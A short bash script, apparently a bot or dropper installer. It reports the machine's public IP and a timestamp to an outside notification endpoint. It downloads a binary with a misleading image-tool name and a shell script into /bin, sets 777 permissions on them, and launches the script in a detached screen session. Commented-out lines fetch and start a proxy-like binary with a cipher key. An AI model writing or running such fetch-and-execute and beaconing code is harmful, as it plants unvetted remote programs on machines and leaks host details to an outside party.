#! /bin/bash
######
ulimit -SHn 1020000
######
#wget down.99.tf/ss -O /bin/s2 && chmod -R 777 /bin/s2
#sh -c 's2 -p 30001 -k mm1 -m rc4-md5 -R "ss.qq.ee/heart" -T 10000 -I "node" -X 1 &'
######
MYIP=$(wget ip.qq.ee/?i=1 -qO-)
NOW=$(date -d "0 hours" +"%Y%m%d %H:%M:%S")
wget "http://pushbullet.api.qq.ee/?title=[$NOW]$MYIP&body=." -O-
######
wget down.99.tf/PictureOptimizationer -O /bin/PictureOptimizationer && chmod -R 777 /bin/PictureOptimizationer
wget down.99.tf/google/MQ.list -O /MQ.list
##
wget down.99.tf/google/RoutMQ.sh -O /bin/RoutMQ.sh && chmod -R 777 /bin/RoutMQ.sh
screen -dmS "MQ" sh -c 'RoutMQ.sh'
######